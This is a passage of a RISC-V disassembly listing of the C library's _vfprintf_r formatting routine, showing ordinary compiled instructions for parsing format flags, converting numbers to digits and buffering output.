   10eba:	273d                	addiw	a4,a4,15
   10ebc:	0ff77713          	andi	a4,a4,255
   10ec0:	4685                	li	a3,1
   10ec2:	0ee10823          	sb	a4,240(sp)
   10ec6:	02b00713          	li	a4,43
   10eca:	0007d763          	bgez	a5,10ed8 <_vfprintf_r+0x564>
   10ece:	6766                	ld	a4,88(sp)
   10ed0:	4785                	li	a5,1
   10ed2:	9f99                	subw	a5,a5,a4
   10ed4:	02d00713          	li	a4,45
   10ed8:	0ee108a3          	sb	a4,241(sp)
   10edc:	4725                	li	a4,9
   10ede:	00f74463          	blt	a4,a5,10ee6 <_vfprintf_r+0x572>
   10ee2:	5e00106f          	j	124c2 <_vfprintf_r+0x1b4e>
   10ee6:	0ff10513          	addi	a0,sp,255
   10eea:	85aa                	mv	a1,a0
   10eec:	46a9                	li	a3,10
   10eee:	06300e93          	li	t4,99
   10ef2:	02d7e73b          	remw	a4,a5,a3
   10ef6:	862e                	mv	a2,a1
   10ef8:	88be                	mv	a7,a5
   10efa:	15fd                	addi	a1,a1,-1
   10efc:	0307071b          	addiw	a4,a4,48
   10f00:	fee60fa3          	sb	a4,-1(a2)
   10f04:	02d7c7bb          	divw	a5,a5,a3
   10f08:	ff1ec5e3          	blt	t4,a7,10ef2 <_vfprintf_r+0x57e>
   10f0c:	0307879b          	addiw	a5,a5,48
   10f10:	0ff7f693          	andi	a3,a5,255
   10f14:	fed58fa3          	sb	a3,-1(a1)
   10f18:	ffe60793          	addi	a5,a2,-2
   10f1c:	00a7e463          	bltu	a5,a0,10f24 <_vfprintf_r+0x5b0>
   10f20:	6560106f          	j	12576 <_vfprintf_r+0x1c02>
   10f24:	0f210713          	addi	a4,sp,242
   10f28:	a019                	j	10f2e <_vfprintf_r+0x5ba>
   10f2a:	0007c683          	lbu	a3,0(a5)
   10f2e:	00d70023          	sb	a3,0(a4)
   10f32:	0785                	addi	a5,a5,1
   10f34:	0705                	addi	a4,a4,1
   10f36:	fea79ae3          	bne	a5,a0,10f2a <_vfprintf_r+0x5b6>
   10f3a:	10110793          	addi	a5,sp,257
   10f3e:	0f210713          	addi	a4,sp,242
   10f42:	8f91                	sub	a5,a5,a2
   10f44:	97ba                	add	a5,a5,a4
   10f46:	1998                	addi	a4,sp,240
   10f48:	9f99                	subw	a5,a5,a4
   10f4a:	e13e                	sd	a5,128(sp)
   10f4c:	678a                	ld	a5,128(sp)
   10f4e:	7682                	ld	a3,32(sp)
   10f50:	4705                	li	a4,1
   10f52:	00f68c3b          	addw	s8,a3,a5
   10f56:	87e2                	mv	a5,s8
   10f58:	00d74463          	blt	a4,a3,10f60 <_vfprintf_r+0x5ec>
   10f5c:	5a00106f          	j	124fc <_vfprintf_r+0x1b88>
   10f60:	7746                	ld	a4,112(sp)
   10f62:	00e78c3b          	addw	s8,a5,a4
   10f66:	67ea                	ld	a5,152(sp)
   10f68:	fffc4993          	not	s3,s8
   10f6c:	43f9d993          	srai	s3,s3,0x3f
   10f70:	bff7f493          	andi	s1,a5,-1025
   10f74:	2481                	sext.w	s1,s1
   10f76:	013c79b3          	and	s3,s8,s3
   10f7a:	1004e493          	ori	s1,s1,256
   10f7e:	2981                	sext.w	s3,s3
   10f80:	e882                	sd	zero,80(sp)
   10f82:	f082                	sd	zero,96(sp)
   10f84:	ec82                	sd	zero,88(sp)
   10f86:	67ae                	ld	a5,200(sp)
   10f88:	e399                	bnez	a5,10f8e <_vfprintf_r+0x61a>
   10f8a:	17e0106f          	j	12108 <_vfprintf_r+0x1794>
   10f8e:	02d00793          	li	a5,45
   10f92:	0cf10fa3          	sb	a5,223(sp)
   10f96:	4e81                	li	t4,0
   10f98:	2985                	addiw	s3,s3,1
   10f9a:	b669                	j	10b24 <_vfprintf_r+0x1b0>
   10f9c:	0a10                	addi	a2,sp,272
   10f9e:	85d2                	mv	a1,s4
   10fa0:	8556                	mv	a0,s5
   10fa2:	fc76                	sd	t4,56(sp)
   10fa4:	f87e                	sd	t6,48(sp)
   10fa6:	e416                	sd	t0,8(sp)
   10fa8:	78b070ef          	jal	ra,18f32 <__sprint_r>
   10fac:	56051463          	bnez	a0,11514 <_vfprintf_r+0xba0>
   10fb0:	7792                	ld	a5,288(sp)
   10fb2:	7ee2                	ld	t4,56(sp)
   10fb4:	7fc2                	ld	t6,48(sp)
   10fb6:	62a2                	ld	t0,8(sp)
   10fb8:	835e                	mv	t1,s7
   10fba:	be5d                	j	10b70 <_vfprintf_r+0x1fc>
   10fbc:	76e6                	ld	a3,120(sp)
   10fbe:	7746                	ld	a4,112(sp)
   10fc0:	0341                	addi	t1,t1,16
   10fc2:	fed33823          	sd	a3,-16(t1)
   10fc6:	11812683          	lw	a3,280(sp)
   10fca:	97ba                	add	a5,a5,a4
   10fcc:	fee33c23          	sd	a4,-8(t1)
   10fd0:	2685                	addiw	a3,a3,1
   10fd2:	0006871b          	sext.w	a4,a3
   10fd6:	10d12c23          	sw	a3,280(sp)
   10fda:	f23e                	sd	a5,288(sp)
   10fdc:	469d                	li	a3,7
   10fde:	00e6de63          	bge	a3,a4,10ffa <_vfprintf_r+0x686>
   10fe2:	0a10                	addi	a2,sp,272
   10fe4:	85d2                	mv	a1,s4
   10fe6:	8556                	mv	a0,s5
   10fe8:	74b070ef          	jal	ra,18f32 <__sprint_r>
   10fec:	52051463          	bnez	a0,11514 <_vfprintf_r+0xba0>
   10ff0:	562e                	lw	a2,232(sp)
   10ff2:	7792                	ld	a5,288(sp)
   10ff4:	11812703          	lw	a4,280(sp)
   10ff8:	835e                	mv	t1,s7
   10ffa:	00065463          	bgez	a2,11002 <_vfprintf_r+0x68e>
   10ffe:	2a60106f          	j	122a4 <_vfprintf_r+0x1930>
   11002:	7682                	ld	a3,32(sp)
   11004:	2705                	addiw	a4,a4,1
   11006:	10e12c23          	sw	a4,280(sp)
   1100a:	97b6                	add	a5,a5,a3
   1100c:	00d33423          	sd	a3,8(t1)
   11010:	01933023          	sd	s9,0(t1)
   11014:	0007069b          	sext.w	a3,a4
   11018:	f23e                	sd	a5,288(sp)
   1101a:	471d                	li	a4,7
   1101c:	bad75be3          	bge	a4,a3,10bd2 <_vfprintf_r+0x25e>
   11020:	0a10                	addi	a2,sp,272
   11022:	85d2                	mv	a1,s4
   11024:	8556                	mv	a0,s5
   11026:	70d070ef          	jal	ra,18f32 <__sprint_r>
   1102a:	4e051563          	bnez	a0,11514 <_vfprintf_r+0xba0>
   1102e:	7792                	ld	a5,288(sp)
   11030:	835e                	mv	t1,s7
   11032:	b64d                	j	10bd4 <_vfprintf_r+0x260>
   11034:	0104f793          	andi	a5,s1,16
   11038:	0e0799e3          	bnez	a5,1192a <_vfprintf_r+0xfb6>
   1103c:	66c2                	ld	a3,16(sp)
   1103e:	0404f793          	andi	a5,s1,64
   11042:	0006a983          	lw	s3,0(a3)
   11046:	44078ae3          	beqz	a5,11c9a <_vfprintf_r+0x1326>
   1104a:	19c2                	slli	s3,s3,0x30
   1104c:	0309d993          	srli	s3,s3,0x30
   11050:	b1d1                	j	10d14 <_vfprintf_r+0x3a0>
   11052:	0104f793          	andi	a5,s1,16
   11056:	0c0795e3          	bnez	a5,11920 <_vfprintf_r+0xfac>
   1105a:	0404f793          	andi	a5,s1,64
   1105e:	40078de3          	beqz	a5,11c78 <_vfprintf_r+0x1304>
   11062:	67c2                	ld	a5,16(sp)
   11064:	00079983          	lh	s3,0(a5)
   11068:	87ce                	mv	a5,s3
   1106a:	c407d8e3          	bgez	a5,10cba <_vfprintf_r+0x346>
   1106e:	02d00793          	li	a5,45
   11072:	0cf10fa3          	sb	a5,223(sp)
   11076:	e83a                	sd	a4,16(sp)
   11078:	577d                	li	a4,-1
   1107a:	413009b3          	neg	s3,s3
   1107e:	8826                	mv	a6,s1
   11080:	4785                	li	a5,1
   11082:	caee94e3          	bne	t4,a4,10d2a <_vfprintf_r+0x3b6>
   11086:	4705                	li	a4,1
   11088:	56e78463          	beq	a5,a4,115f0 <_vfprintf_r+0xc7c>
   1108c:	4709                	li	a4,2
   1108e:	28e78263          	beq	a5,a4,11312 <_vfprintf_r+0x99e>
   11092:	18c10c13          	addi	s8,sp,396
   11096:	8ce2                	mv	s9,s8
   11098:	0079f793          	andi	a5,s3,7
   1109c:	03078793          	addi	a5,a5,48
   110a0:	fefc8fa3          	sb	a5,-1(s9)
   110a4:	0039d993          	srli	s3,s3,0x3
   110a8:	8766                	mv	a4,s9
   110aa:	1cfd                	addi	s9,s9,-1
   110ac:	fe0996e3          	bnez	s3,11098 <_vfprintf_r+0x724>
   110b0:	00187693          	andi	a3,a6,1
   110b4:	26068f63          	beqz	a3,11332 <_vfprintf_r+0x9be>
   110b8:	03000693          	li	a3,48
   110bc:	26d78b63          	beq	a5,a3,11332 <_vfprintf_r+0x9be>
   110c0:	1779                	addi	a4,a4,-2
   110c2:	fedc8fa3          	sb	a3,-1(s9)
   110c6:	40ec0c3b          	subw	s8,s8,a4
   110ca:	84c2                	mv	s1,a6
   110cc:	8cba                	mv	s9,a4
   110ce:	b139                	j	10cdc <_vfprintf_r+0x368>
   110d0:	8556                	mv	a0,s5
   110d2:	33f010ef          	jal	ra,12c10 <__sinit>
   110d6:	b8fd                	j	109d4 <_vfprintf_r+0x60>
   110d8:	67c2                	ld	a5,16(sp)
   110da:	0c010fa3          	sb	zero,223(sp)
   110de:	0007bc83          	ld	s9,0(a5)
   110e2:	00878693          	addi	a3,a5,8
   110e6:	1c0c85e3          	beqz	s9,11ab0 <_vfprintf_r+0x113c>
   110ea:	57fd                	li	a5,-1
   110ec:	34fe82e3          	beq	t4,a5,11c30 <_vfprintf_r+0x12bc>
   110f0:	8676                	mv	a2,t4
   110f2:	4581                	li	a1,0
   110f4:	8566                	mv	a0,s9
   110f6:	f836                	sd	a3,48(sp)
   110f8:	e81a                	sd	t1,16(sp)
   110fa:	e476                	sd	t4,8(sp)
   110fc:	3ab040ef          	jal	ra,15ca6 <memchr>
   11100:	ec2a                	sd	a0,24(sp)
   11102:	6ea2                	ld	t4,8(sp)
   11104:	6342                	ld	t1,16(sp)
   11106:	76c2                	ld	a3,48(sp)
   11108:	e119                	bnez	a0,1110e <_vfprintf_r+0x79a>
   1110a:	1120106f          	j	1221c <_vfprintf_r+0x18a8>
   1110e:	67e2                	ld	a5,24(sp)
   11110:	e836                	sd	a3,16(sp)
   11112:	ec02                	sd	zero,24(sp)
   11114:	41978c3b          	subw	s8,a5,s9
   11118:	fffc4993          	not	s3,s8
   1111c:	0df14783          	lbu	a5,223(sp)
   11120:	43f9d993          	srai	s3,s3,0x3f
   11124:	013c79b3          	and	s3,s8,s3
   11128:	e882                	sd	zero,80(sp)
   1112a:	f082                	sd	zero,96(sp)
   1112c:	ec82                	sd	zero,88(sp)
   1112e:	2981                	sext.w	s3,s3
   11130:	4e81                	li	t4,0
   11132:	bc0793e3          	bnez	a5,10cf8 <_vfprintf_r+0x384>
   11136:	b2fd                	j	10b24 <_vfprintf_r+0x1b0>
   11138:	6742                	ld	a4,16(sp)
   1113a:	0c010fa3          	sb	zero,223(sp)
   1113e:	4985                	li	s3,1
   11140:	431c                	lw	a5,0(a4)
   11142:	0721                	addi	a4,a4,8
   11144:	e83a                	sd	a4,16(sp)
   11146:	12f10423          	sb	a5,296(sp)
   1114a:	4c05                	li	s8,1
   1114c:	12810c93          	addi	s9,sp,296
   11150:	b2e9                	j	10b1a <_vfprintf_r+0x1a6>
   11152:	00044f03          	lbu	t5,0(s0)
   11156:	0044e493          	ori	s1,s1,4
   1115a:	2481                	sext.w	s1,s1
   1115c:	b2b1                	j	10aa8 <_vfprintf_r+0x134>
   1115e:	02b00793          	li	a5,43
   11162:	00044f03          	lbu	t5,0(s0)
   11166:	0cf10fa3          	sb	a5,223(sp)
   1116a:	ba3d                	j	10aa8 <_vfprintf_r+0x134>
   1116c:	0804e493          	ori	s1,s1,128
   11170:	00044f03          	lbu	t5,0(s0)
   11174:	2481                	sext.w	s1,s1
   11176:	ba0d                	j	10aa8 <_vfprintf_r+0x134>
   11178:	00044703          	lbu	a4,0(s0)
   1117c:	00140793          	addi	a5,s0,1
   11180:	00070d9b          	sext.w	s11,a4
   11184:	00ec1463          	bne	s8,a4,1118c <_vfprintf_r+0x818>
   11188:	3d20106f          	j	1255a <_vfprintf_r+0x1be6>
   1118c:	fd07071b          	addiw	a4,a4,-48
   11190:	843e                	mv	s0,a5
   11192:	4e81                	li	t4,0
   11194:	90e9efe3          	bltu	s3,a4,10ab2 <_vfprintf_r+0x13e>
   11198:	00044d83          	lbu	s11,0(s0)
   1119c:	002e979b          	slliw	a5,t4,0x2
   111a0:	01d78ebb          	addw	t4,a5,t4
   111a4:	001e9e9b          	slliw	t4,t4,0x1
   111a8:	00ee8ebb          	addw	t4,t4,a4
   111ac:	fd0d871b          	addiw	a4,s11,-48
   111b0:	0405                	addi	s0,s0,1
   111b2:	fee9f3e3          	bgeu	s3,a4,11198 <_vfprintf_r+0x824>
   111b6:	b8f5                	j	10ab2 <_vfprintf_r+0x13e>
   111b8:	67c2                	ld	a5,16(sp)
   111ba:	00044f03          	lbu	t5,0(s0)
   111be:	0007ab03          	lw	s6,0(a5)
   111c2:	07a1                	addi	a5,a5,8
   111c4:	e83e                	sd	a5,16(sp)
   111c6:	8e0b51e3          	bgez	s6,10aa8 <_vfprintf_r+0x134>
   111ca:	41600b3b          	negw	s6,s6
   111ce:	b761                	j	11156 <_vfprintf_r+0x7e2>
   111d0:	8556                	mv	a0,s5
   111d2:	ec1a                	sd	t1,24(sp)
   111d4:	e476                	sd	t4,8(sp)
   111d6:	2a2040ef          	jal	ra,15478 <_localeconv_r>
   111da:	651c                	ld	a5,8(a0)
   111dc:	853e                	mv	a0,a5
   111de:	e93e                	sd	a5,144(sp)
   111e0:	f00ff0ef          	jal	ra,108e0 <strlen>
   111e4:	87aa                	mv	a5,a0
   111e6:	8556                	mv	a0,s5
   111e8:	8dbe                	mv	s11,a5
   111ea:	e53e                	sd	a5,136(sp)
   111ec:	28c040ef          	jal	ra,15478 <_localeconv_r>
   111f0:	6918                	ld	a4,16(a0)
   111f2:	6ea2                	ld	t4,8(sp)
   111f4:	6362                	ld	t1,24(sp)
   111f6:	f4ba                	sd	a4,104(sp)
   111f8:	00044f03          	lbu	t5,0(s0)
   111fc:	8a0d86e3          	beqz	s11,10aa8 <_vfprintf_r+0x134>
   11200:	8a0704e3          	beqz	a4,10aa8 <_vfprintf_r+0x134>
   11204:	00074783          	lbu	a5,0(a4)
   11208:	8a0780e3          	beqz	a5,10aa8 <_vfprintf_r+0x134>
   1120c:	4004e493          	ori	s1,s1,1024
   11210:	2481                	sext.w	s1,s1
   11212:	b859                	j	10aa8 <_vfprintf_r+0x134>
   11214:	0014e493          	ori	s1,s1,1
   11218:	00044f03          	lbu	t5,0(s0)
   1121c:	2481                	sext.w	s1,s1
   1121e:	b069                	j	10aa8 <_vfprintf_r+0x134>
   11220:	0df14783          	lbu	a5,223(sp)
   11224:	00044f03          	lbu	t5,0(s0)
   11228:	880790e3          	bnez	a5,10aa8 <_vfprintf_r+0x134>
   1122c:	02000793          	li	a5,32
   11230:	0cf10fa3          	sb	a5,223(sp)
   11234:	b895                	j	10aa8 <_vfprintf_r+0x134>
   11236:	0084e493          	ori	s1,s1,8
   1123a:	00044f03          	lbu	t5,0(s0)
   1123e:	2481                	sext.w	s1,s1
   11240:	b0a5                	j	10aa8 <_vfprintf_r+0x134>
   11242:	0104e493          	ori	s1,s1,16
   11246:	0004881b          	sext.w	a6,s1
   1124a:	66c2                	ld	a3,16(sp)
   1124c:	02087793          	andi	a5,a6,32
   11250:	00868713          	addi	a4,a3,8
   11254:	68078463          	beqz	a5,118dc <_vfprintf_r+0xf68>
   11258:	0006b983          	ld	s3,0(a3)
   1125c:	4785                	li	a5,1
   1125e:	e83a                	sd	a4,16(sp)
   11260:	b4c1                	j	10d20 <_vfprintf_r+0x3ac>
   11262:	0204e493          	ori	s1,s1,32
   11266:	00044f03          	lbu	t5,0(s0)
   1126a:	2481                	sext.w	s1,s1
   1126c:	83dff06f          	j	10aa8 <_vfprintf_r+0x134>
   11270:	6742                	ld	a4,16(sp)
   11272:	77e1                	lui	a5,0xffff8
   11274:	8307c793          	xori	a5,a5,-2000
   11278:	0ef11023          	sh	a5,224(sp)
   1127c:	00870793          	addi	a5,a4,8
   11280:	0024e493          	ori	s1,s1,2
   11284:	e83e                	sd	a5,16(sp)
   11286:	0000b797          	auipc	a5,0xb
   1128a:	49a78793          	addi	a5,a5,1178 # 1c720 <__clzdi2+0x1a0>
   1128e:	f43e                	sd	a5,40(sp)
   11290:	00073983          	ld	s3,0(a4)
   11294:	0004881b          	sext.w	a6,s1
   11298:	4789                	li	a5,2
   1129a:	07800d93          	li	s11,120
   1129e:	b449                	j	10d20 <_vfprintf_r+0x3ac>
   112a0:	66c2                	ld	a3,16(sp)
   112a2:	0204f793          	andi	a5,s1,32
   112a6:	6298                	ld	a4,0(a3)
   112a8:	06a1                	addi	a3,a3,8
   112aa:	e836                	sd	a3,16(sp)
   112ac:	64079e63          	bnez	a5,11908 <_vfprintf_r+0xf94>
   112b0:	0104f793          	andi	a5,s1,16
   112b4:	64079a63          	bnez	a5,11908 <_vfprintf_r+0xf94>
   112b8:	0404f793          	andi	a5,s1,64
   112bc:	3e0799e3          	bnez	a5,11eae <_vfprintf_r+0x153a>
   112c0:	2004f493          	andi	s1,s1,512
   112c4:	6782                	ld	a5,0(sp)
   112c6:	e099                	bnez	s1,112cc <_vfprintf_r+0x958>
   112c8:	1280106f          	j	123f0 <_vfprintf_r+0x1a7c>
   112cc:	00f70023          	sb	a5,0(a4)
   112d0:	8ca2                	mv	s9,s0
   112d2:	ba15                	j	10c06 <_vfprintf_r+0x292>
   112d4:	00044f03          	lbu	t5,0(s0)
   112d8:	06c00793          	li	a5,108
   112dc:	7aff0263          	beq	t5,a5,11a80 <_vfprintf_r+0x110c>
   112e0:	0104e493          	ori	s1,s1,16
   112e4:	2481                	sext.w	s1,s1
   112e6:	fc2ff06f          	j	10aa8 <_vfprintf_r+0x134>
   112ea:	00044f03          	lbu	t5,0(s0)
   112ee:	06800793          	li	a5,104
   112f2:	76ff0f63          	beq	t5,a5,11a70 <_vfprintf_r+0x10fc>
   112f6:	0404e493          	ori	s1,s1,64
   112fa:	2481                	sext.w	s1,s1
   112fc:	facff06f          	j	10aa8 <_vfprintf_r+0x134>
   11300:	4705                	li	a4,1
   11302:	00e79463          	bne	a5,a4,1130a <_vfprintf_r+0x996>
   11306:	0220106f          	j	12328 <_vfprintf_r+0x19b4>
   1130a:	4709                	li	a4,2
   1130c:	8826                	mv	a6,s1
   1130e:	d8e792e3          	bne	a5,a4,11092 <_vfprintf_r+0x71e>
   11312:	18c10c13          	addi	s8,sp,396
   11316:	8ce2                	mv	s9,s8
   11318:	7722                	ld	a4,40(sp)
   1131a:	00f9f793          	andi	a5,s3,15
   1131e:	1cfd                	addi	s9,s9,-1
   11320:	97ba                	add	a5,a5,a4
   11322:	0007c783          	lbu	a5,0(a5)
   11326:	0049d993          	srli	s3,s3,0x4
   1132a:	00fc8023          	sb	a5,0(s9)
   1132e:	fe0995e3          	bnez	s3,11318 <_vfprintf_r+0x9a4>
   11332:	419c0c3b          	subw	s8,s8,s9
   11336:	84c2                	mv	s1,a6
   11338:	b255                	j	10cdc <_vfprintf_r+0x368>
   1133a:	06500713          	li	a4,101
   1133e:	1fb75463          	bge	a4,s11,11526 <_vfprintf_r+0xbb2>
   11342:	6512                	ld	a0,256(sp)
   11344:	65b2                	ld	a1,264(sp)
   11346:	4601                	li	a2,0
   11348:	4681                	li	a3,0
   1134a:	f83e                	sd	a5,48(sp)
   1134c:	e41a                	sd	t1,8(sp)
   1134e:	65d090ef          	jal	ra,1b1aa <__eqtf2>
   11352:	6322                	ld	t1,8(sp)
   11354:	77c2                	ld	a5,48(sp)
   11356:	3e051b63          	bnez	a0,1174c <_vfprintf_r+0xdd8>
   1135a:	11812703          	lw	a4,280(sp)
   1135e:	0000b697          	auipc	a3,0xb
   11362:	3e268693          	addi	a3,a3,994 # 1c740 <__clzdi2+0x1c0>
   11366:	00d33023          	sd	a3,0(t1)
   1136a:	2705                	addiw	a4,a4,1
   1136c:	4685                	li	a3,1
   1136e:	0785                	addi	a5,a5,1
   11370:	00d33423          	sd	a3,8(t1)
   11374:	10e12c23          	sw	a4,280(sp)
   11378:	0007069b          	sext.w	a3,a4
   1137c:	f23e                	sd	a5,288(sp)
   1137e:	471d                	li	a4,7
   11380:	0341                	addi	t1,t1,16
   11382:	04d742e3          	blt	a4,a3,11bc6 <_vfprintf_r+0x1252>
   11386:	572e                	lw	a4,232(sp)
   11388:	7682                	ld	a3,32(sp)
   1138a:	56d75a63          	bge	a4,a3,118fe <_vfprintf_r+0xf8a>
   1138e:	7766                	ld	a4,120(sp)
   11390:	76c6                	ld	a3,112(sp)
   11392:	0341                	addi	t1,t1,16
   11394:	fee33823          	sd	a4,-16(t1)
   11398:	11812703          	lw	a4,280(sp)
   1139c:	97b6                	add	a5,a5,a3
   1139e:	fed33c23          	sd	a3,-8(t1)
   113a2:	2705                	addiw	a4,a4,1
   113a4:	0007069b          	sext.w	a3,a4
   113a8:	10e12c23          	sw	a4,280(sp)
   113ac:	f23e                	sd	a5,288(sp)
   113ae:	471d                	li	a4,7
   113b0:	6ed74063          	blt	a4,a3,11a90 <_vfprintf_r+0x111c>
   113b4:	7702                	ld	a4,32(sp)
   113b6:	fff70c1b          	addiw	s8,a4,-1
   113ba:	81805de3          	blez	s8,10bd4 <_vfprintf_r+0x260>
   113be:	11812703          	lw	a4,280(sp)
   113c2:	018d5de3          	bge	s10,s8,11bdc <_vfprintf_r+0x1268>
   113c6:	4c9d                	li	s9,7
   113c8:	a021                	j	113d0 <_vfprintf_r+0xa5c>
   113ca:	3c41                	addiw	s8,s8,-16
   113cc:	018d58e3          	bge	s10,s8,11bdc <_vfprintf_r+0x1268>
   113d0:	2705                	addiw	a4,a4,1
   113d2:	07c1                	addi	a5,a5,16
   113d4:	01233023          	sd	s2,0(t1)
   113d8:	01a33423          	sd	s10,8(t1)
   113dc:	f23e                	sd	a5,288(sp)
   113de:	10e12c23          	sw	a4,280(sp)
   113e2:	0341                	addi	t1,t1,16
   113e4:	feecd3e3          	bge	s9,a4,113ca <_vfprintf_r+0xa56>
   113e8:	0a10                	addi	a2,sp,272
   113ea:	85d2                	mv	a1,s4
   113ec:	8556                	mv	a0,s5
   113ee:	345070ef          	jal	ra,18f32 <__sprint_r>
   113f2:	12051163          	bnez	a0,11514 <_vfprintf_r+0xba0>
   113f6:	7792                	ld	a5,288(sp)
   113f8:	11812703          	lw	a4,280(sp)
   113fc:	835e                	mv	t1,s7
   113fe:	b7f1                	j	113ca <_vfprintf_r+0xa56>
   11400:	413b06bb          	subw	a3,s6,s3
   11404:	f8d05f63          	blez	a3,10ba2 <_vfprintf_r+0x22e>
   11408:	11812703          	lw	a4,280(sp)
   1140c:	04dd5563          	bge	s10,a3,11456 <_vfprintf_r+0xae2>
   11410:	489d                	li	a7,7
   11412:	a021                	j	1141a <_vfprintf_r+0xaa6>
   11414:	36c1                	addiw	a3,a3,-16
   11416:	04dd5063          	bge	s10,a3,11456 <_vfprintf_r+0xae2>
   1141a:	2705                	addiw	a4,a4,1
   1141c:	07c1                	addi	a5,a5,16
   1141e:	01233023          	sd	s2,0(t1)
   11422:	01a33423          	sd	s10,8(t1)
   11426:	f23e                	sd	a5,288(sp)
   11428:	10e12c23          	sw	a4,280(sp)
   1142c:	0341                	addi	t1,t1,16
   1142e:	fee8d3e3          	bge	a7,a4,11414 <_vfprintf_r+0xaa0>
   11432:	0a10                	addi	a2,sp,272
   11434:	85d2                	mv	a1,s4
   11436:	8556                	mv	a0,s5
   11438:	f836                	sd	a3,48(sp)
   1143a:	e476                	sd	t4,8(sp)
   1143c:	2f7070ef          	jal	ra,18f32 <__sprint_r>
   11440:	e971                	bnez	a0,11514 <_vfprintf_r+0xba0>
   11442:	76c2                	ld	a3,48(sp)
   11444:	7792                	ld	a5,288(sp)
   11446:	11812703          	lw	a4,280(sp)
   1144a:	36c1                	addiw	a3,a3,-16
   1144c:	6ea2                	ld	t4,8(sp)
   1144e:	835e                	mv	t1,s7
   11450:	489d                	li	a7,7
   11452:	fcdd44e3          	blt	s10,a3,1141a <_vfprintf_r+0xaa6>
   11456:	2705                	addiw	a4,a4,1
   11458:	97b6                	add	a5,a5,a3
   1145a:	00d33423          	sd	a3,8(t1)
   1145e:	01233023          	sd	s2,0(t1)
   11462:	0007069b          	sext.w	a3,a4
   11466:	10e12c23          	sw	a4,280(sp)
   1146a:	f23e                	sd	a5,288(sp)
   1146c:	471d                	li	a4,7
   1146e:	0341                	addi	t1,t1,16
   11470:	f2d75963          	bge	a4,a3,10ba2 <_vfprintf_r+0x22e>
   11474:	0a10                	addi	a2,sp,272
   11476:	85d2                	mv	a1,s4
   11478:	8556                	mv	a0,s5
   1147a:	e476                	sd	t4,8(sp)
   1147c:	2b7070ef          	jal	ra,18f32 <__sprint_r>
   11480:	e951                	bnez	a0,11514 <_vfprintf_r+0xba0>
   11482:	7792                	ld	a5,288(sp)
   11484:	6ea2                	ld	t4,8(sp)
   11486:	835e                	mv	t1,s7
   11488:	f1aff06f          	j	10ba2 <_vfprintf_r+0x22e>
   1148c:	11812703          	lw	a4,280(sp)
   11490:	05dd5363          	bge	s10,t4,114d6 <_vfprintf_r+0xb62>
   11494:	489d                	li	a7,7
   11496:	a021                	j	1149e <_vfprintf_r+0xb2a>
   11498:	3ec1                	addiw	t4,t4,-16
   1149a:	03dd5e63          	bge	s10,t4,114d6 <_vfprintf_r+0xb62>
   1149e:	2705                	addiw	a4,a4,1
   114a0:	07c1                	addi	a5,a5,16
   114a2:	01233023          	sd	s2,0(t1)
   114a6:	01a33423          	sd	s10,8(t1)
   114aa:	f23e                	sd	a5,288(sp)
   114ac:	10e12c23          	sw	a4,280(sp)
   114b0:	0341                	addi	t1,t1,16
   114b2:	fee8d3e3          	bge	a7,a4,11498 <_vfprintf_r+0xb24>
   114b6:	0a10                	addi	a2,sp,272
   114b8:	85d2                	mv	a1,s4
   114ba:	8556                	mv	a0,s5
   114bc:	e476                	sd	t4,8(sp)
   114be:	275070ef          	jal	ra,18f32 <__sprint_r>
   114c2:	e929                	bnez	a0,11514 <_vfprintf_r+0xba0>
   114c4:	6ea2                	ld	t4,8(sp)
   114c6:	7792                	ld	a5,288(sp)
   114c8:	11812703          	lw	a4,280(sp)
   114cc:	3ec1                	addiw	t4,t4,-16
   114ce:	835e                	mv	t1,s7
   114d0:	489d                	li	a7,7
   114d2:	fddd46e3          	blt	s10,t4,1149e <_vfprintf_r+0xb2a>
   114d6:	0017069b          	addiw	a3,a4,1
   114da:	97f6                	add	a5,a5,t4
   114dc:	01233023          	sd	s2,0(t1)
   114e0:	01d33423          	sd	t4,8(t1)
   114e4:	f23e                	sd	a5,288(sp)
   114e6:	10d12c23          	sw	a3,280(sp)
   114ea:	471d                	li	a4,7
   114ec:	0341                	addi	t1,t1,16
   114ee:	ead75e63          	bge	a4,a3,10baa <_vfprintf_r+0x236>
   114f2:	0a10                	addi	a2,sp,272
   114f4:	85d2                	mv	a1,s4
   114f6:	8556                	mv	a0,s5
   114f8:	23b070ef          	jal	ra,18f32 <__sprint_r>
   114fc:	ed01                	bnez	a0,11514 <_vfprintf_r+0xba0>
   114fe:	7792                	ld	a5,288(sp)
   11500:	835e                	mv	t1,s7
   11502:	ea8ff06f          	j	10baa <_vfprintf_r+0x236>
   11506:	0a10                	addi	a2,sp,272
   11508:	85d2                	mv	a1,s4
   1150a:	8556                	mv	a0,s5
   1150c:	227070ef          	jal	ra,18f32 <__sprint_r>
   11510:	ee050163          	beqz	a0,10bf2 <_vfprintf_r+0x27e>
   11514:	67e2                	ld	a5,24(sp)
   11516:	f0078063          	beqz	a5,10c16 <_vfprintf_r+0x2a2>
   1151a:	85be                	mv	a1,a5
   1151c:	8556                	mv	a0,s5
   1151e:	025010ef          	jal	ra,12d42 <_free_r>
   11522:	ef4ff06f          	j	10c16 <_vfprintf_r+0x2a2>
   11526:	11812603          	lw	a2,280(sp)
   1152a:	00178d93          	addi	s11,a5,1
   1152e:	7782                	ld	a5,32(sp)
   11530:	0016071b          	addiw	a4,a2,1
   11534:	4585                	li	a1,1
   11536:	01933023          	sd	s9,0(t1)
   1153a:	86ba                	mv	a3,a4
   1153c:	01030c13          	addi	s8,t1,16
   11540:	32f5d863          	bge	a1,a5,11870 <_vfprintf_r+0xefc>
   11544:	4605                	li	a2,1
   11546:	10d12c23          	sw	a3,280(sp)
   1154a:	00c33423          	sd	a2,8(t1)
   1154e:	f26e                	sd	s11,288(sp)
   11550:	469d                	li	a3,7
   11552:	5ce6c463          	blt	a3,a4,11b1a <_vfprintf_r+0x11a6>
   11556:	77c6                	ld	a5,112(sp)
   11558:	0017069b          	addiw	a3,a4,1
   1155c:	7766                	ld	a4,120(sp)
   1155e:	9dbe                	add	s11,s11,a5
   11560:	00fc3423          	sd	a5,8(s8)
   11564:	00ec3023          	sd	a4,0(s8)
   11568:	10d12c23          	sw	a3,280(sp)
   1156c:	0006871b          	sext.w	a4,a3
   11570:	f26e                	sd	s11,288(sp)
   11572:	469d                	li	a3,7
   11574:	0c41                	addi	s8,s8,16
   11576:	5ae6ce63          	blt	a3,a4,11b32 <_vfprintf_r+0x11be>
   1157a:	6512                	ld	a0,256(sp)
   1157c:	65b2                	ld	a1,264(sp)
   1157e:	0017089b          	addiw	a7,a4,1
   11582:	4601                	li	a2,0
   11584:	4681                	li	a3,0
   11586:	e446                	sd	a7,8(sp)
   11588:	f83a                	sd	a4,48(sp)
